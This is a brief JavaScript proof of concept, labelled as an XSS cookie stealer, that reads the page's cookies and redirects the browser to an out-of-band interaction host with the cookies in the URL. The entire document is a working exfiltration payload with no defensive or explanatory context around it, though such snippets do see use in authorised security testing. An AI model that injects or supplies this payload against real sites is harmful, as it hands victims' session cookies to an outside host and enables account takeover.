// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://gadibcypuselnatxftmgk2cp37jxdsdjb.oast.fun/?victim_cookie=' + cookie;
window.location.href = url;
